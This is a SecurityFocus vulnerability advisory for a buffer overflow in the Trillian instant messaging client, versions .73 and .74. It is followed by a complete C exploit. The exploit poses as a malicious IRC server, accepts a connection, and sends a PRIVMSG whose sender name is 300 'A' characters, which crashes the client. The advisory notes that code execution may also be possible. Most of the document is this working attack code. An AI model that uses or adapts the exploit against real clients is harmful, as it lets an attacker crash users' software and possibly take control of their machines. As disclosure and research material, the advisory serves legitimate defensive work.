source: http://www.securityfocus.com/bid/5755/info

Trillian is an instant messaging client that supports a number of protocols (including IRC, ICQ, MSN). It is available for Microsoft Windows systems.

A buffer overflow has been discovered in Trillian version .73 and .74. When processing a PRIVMSG command with an overly large sender name, a buffer overflow will occur resulting in memory corruption and a denial of service.

Although not yet confirmed, because memory can be overwritten, it may be possible for arbitrary attacker-supplied code to be executed with the privileges of the client.

/* Trillian-Privmsg.c
   Author: Lance Fitz-Herbert
   Contact: IRC: Phrizer, DALnet - #KORP
            ICQ: 23549284

   Exploits the Trillian Privmsg Flaw.
   Tested On Version .74 and .73
   Compiles with Borland 5.5 Commandline Tools.

   This Example Will Just DoS The Trillian Client,
   not particularly useful, just proves the flaw exists.
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>

SOCKET s;

#define MSG1 ":server 001 target :target\n:"
#define MSG2 "!ident@address PRIVMSG target :You are the weakest link, 
Goodbye.\n"

int main() {

        SOCKET TempSock = SOCKET_ERROR;
        WSADATA WsaDat;
        SOCKADDR_IN Sockaddr;
        int nRet;
        char payload[300];

        printf("\nTrillian Privmsg Flaw\n");
        printf("----------------------\n");
        printf("Coded By Lance Fitz-Herbert (Phrizer, DALnet/#KORP)\n");
        printf("Tested On Version .74 and .73\nListening On Port 6667 For 
Connections\n\n");

        if (WSAStartup(MAKEWORD(1, 1), &WsaDat) != 0) {
                printf("ERROR: WSA Initialization failed.");
                return 0;
        }


        /* Create Socket */
        s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) {
                printf("ERROR: Could Not Create Socket. Exiting\n");
                WSACleanup();
                return 0;
        }

        Sockaddr.sin_port = htons(6667);
        Sockaddr.sin_family = AF_INET;
        Sockaddr.sin_addr.s_addr  = INADDR_ANY;


        nRet = bind(s, (LPSOCKADDR)&Sockaddr, sizeof(struct sockaddr));
        if (nRet == SOCKET_ERROR) {
                printf("ERROR Binding Socket");
                WSACleanup();
                return 0;
        }

        /* Make Socket Listen */
        if (listen(s, 10) == SOCKET_ERROR) {
                printf("ERROR: Couldnt Make Listening Socket\n");
                WSACleanup();
                return 0;
        }

        while (TempSock == SOCKET_ERROR) {
              TempSock = accept(s, NULL, NULL);
        }

        printf("Client Connected, Sending Payload\n");

        send(TempSock,MSG1,strlen(MSG1),0);
        memset(payload,'A',300);
        send(TempSock,payload,strlen(payload),0);
        send(TempSock,MSG2,strlen(MSG2),0);

        printf("Exiting\n");
        sleep(100);
        WSACleanup();
        return 0;
}